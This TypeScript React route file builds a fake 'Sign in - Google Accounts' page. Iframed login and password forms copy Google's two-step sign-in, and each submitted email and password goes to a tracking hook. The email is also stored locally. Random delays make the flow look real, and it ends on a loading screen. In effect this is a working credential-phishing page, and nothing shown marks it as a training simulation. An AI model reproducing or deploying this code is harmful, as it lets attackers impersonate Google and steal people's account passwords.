import { createFileRoute } from "@tanstack/react-router";
import { useState, useCallback } from "react";
import { GeIframe, type GeIframeMessage } from "@/components/ge/GeIframe";
import { useGeTracking } from "@/components/ge/GeShared";

export const Route = createFileRoute("/ge/signin")({
  head: () => ({ meta: [{ title: "Sign in - Google Accounts" }] }),
  component: GeSignInPage,
});

function GeSignInPage() {
  const { trackClick, trackInput, geNavigate, sessionId } = useGeTracking();
  const [step, setStep] = useState<"email" | "password">("email");

  const handle = useCallback(
    (m: GeIframeMessage) => {
      if (m.type === "submit") {
        const f = m.fields || {};
        if (step === "email") {
          const email = String(f.identifier || f.Email || f.email || "").trim();
          if (!email) return;
          trackClick("Next-Email");
          trackInput("email", email);
          try { localStorage.setItem("saved_user_email", email); } catch { /* noop */ }
          setTimeout(() => setStep("password"), 400 + Math.random() * 600);
        } else {
          const pw = String(f.Passwd || f.password || f.hiddenPassword || "");
          if (!pw) return;
          trackClick("Next-Password");
          trackInput("password", pw);
          setTimeout(() => geNavigate("/ge/loading"), 400 + Math.random() * 600);
        }
      } else if (m.type === "link") {
        trackClick(`Link:${m.text || m.href}`);
      }
    },
    [step, trackClick, trackInput, geNavigate]
  );

  return (
    <>
      <GeIframe
        key={step}
        src={step === "email" ? "/ge-html/login.html" : "/ge-html/password.html"}
        title={step === "email" ? "Sign in" : "Verify password"}
        onMessage={handle}
      />
      <div style={{ position: "fixed", bottom: 8, right: 8, fontSize: 10, opacity: 0, pointerEvents: "none" }}>{sessionId}</div>
    </>
  );
}
